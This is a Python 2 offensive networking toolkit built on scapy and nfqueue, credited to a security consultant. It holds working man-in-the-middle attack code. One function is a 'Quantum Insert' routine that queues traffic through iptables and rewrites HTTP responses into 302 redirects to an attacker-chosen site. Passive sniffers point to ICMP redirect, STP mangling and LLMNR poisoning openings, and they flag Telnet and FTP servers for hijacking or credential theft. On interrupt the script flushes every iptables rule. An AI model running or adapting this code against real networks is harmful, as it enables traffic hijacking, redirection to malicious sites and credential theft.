#!/usr/bin/env python
#
# Author: St0rn (fabien.dromas@synetis.com)
# Organisation: Synetis
# Description:
#

from os import system
from scapy.all import *
import nfqueue
import socket

# Global variables
evil=str()

# Set scapy verbose to 0
conf.verbose=0

################## Utils function ##################

def mac_to_code(addr_mac):
        tmp=addr_mac.split(":")
        code=tmp[0]+tmp[1]+tmp[2]
        return code

################## Scapy function ##################

def show_route():
        print conf.route

def add_net_route(addr, gateway):
        conf.route.add(net=addr, gw=gateway)

def add_host_route(addr, gateway):
        conf.route.add(host=addr, gw=gateway)

def del_net_route(addr, gateway):
        conf.route.delt(net=addr, gw=gateway)

def del_host_route(addr, gateway):
        conf.route.delt(host=addr, gw=gateway)


################## Bridge attack Func ##################

# Set iptable rule to use nfqueue

def set_table(chain, proto):
        table="/sbin/iptables -I "+chain+" -p "+proto+" -j NFQUEUE"
        system(table)

# Bridge function to modify network flow

def bridge(func, chain, proto):
        set_table(chain, proto)
        queue=nfqueue.queue()
        queue.open()
        queue.bind(socket.AF_INET)
        queue.set_callback(func)
        queue.create_queue(0)
        queue.set_queue_maxlen(50000)
        queue.set_mode(nfqueue.NFQNL_COPY_PACKET)
        try:
                print "[*] Attack in progress [*]\n"
                queue.try_run()
        except KeyboardInterrupt:
                system("/sbin/iptables -F")
                queue.unbind(socket.AF_INET)
                queue.close()
                pass

def exit():
 print "exit"

#+++++++++++++++++ Define Bridge Func +++++++++++++++++#

# Define Quantum Insert attack Redirect version

def QuantumInsert_redirect(i, pkt):
    global evil
    payload="HTTP/1.1 302 Found\r\nLocation: %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n" %evil
    p=IP(pkt.get_data())
    if p[TCP].sport==80 and p.haslayer(Raw):
        if "200 OK" in p[TCP].load:
                print "\n[+] Quantum Insert Redirect target %s to %s" %(p[IP].dst, evil)
                p[TCP].load=payload
                del p[IP].chksum
                del p[TCP].chksum
                pkt.set_verdict_modified(nfqueue.NF_ACCEPT, str(p), len(p))
    else:
                pkt.set_verdict(nfqueue.NF_ACCEPT)

#+++++++++++++++ End define Bridge Func +++++++++++++++#


################### Network auto-pwn ###################

# Implement function to determine which mitm method can be execute
# Usage: Run with scapy sniff function => sniff(prn=look_for_mitm_passive)

def look_for_mitm_passive(p):
        proto=list()
        # Find ICMP flow
        if p.haslayer("ICMP") and "ICMP" not in proto:
                print "ICMP is used in this network! Try to use ICMP Redirect"
                proto.append("ICMP")
                # Find Spanning tree flow
        if p.haslayer("STP") and "STP" not in proto:
                print "Spanning Tree Protocol is present! Try to STP Mangling"
                proto.append("STP")


# Get hackable network flow informations
# Usage: Run with scapy sniff function => sniff(prn=get_network_informations)
# Evol:
# 1: Add more protocol
# 2: Launch attack for each network flow
#

def get_network_informations(p):
        proto=list()
        ip=list()
        # Find LLMNR flow
        if p.haslayer("LLMNRQuery") and "LLMNRQuery" not in proto:
                print "LLMNR Query is present! Try to use responder"
                proto.append("LLMNRQuery")
        if p.haslayer("LLMNRResponse") and "LLMNRResponse" not in proto:
                print "LLMNR Response is present! Try to use responder"
                proto.append("LLMNRResponse")
        # Find TCP flow
        if p.haslayer("TCP"):
                if p[TCP].dport==23 and p[IP].dst not in ip:
                        print "%s is a Telnet Server! you can hijack this or steal credential"
                        ip.append(p[IP].dst)
                if p[TCP].dport==21 and p[IP].dst not in ip:
                        print "%s is a FTP Server! you can hijack this or steal credential"
                        ip.append(p[IP].dst)


# Run Quantum Insert Attack Redirect version
def Run_QuantumInsert_redirect(evilsite):
        global evil
        evil=evilsite
        bridge(QuantumInsert_redirect, "INPUT", "tcp")

#################### Main Function #####################

if __name__ == "__main__":
        print "Let me talk about that"
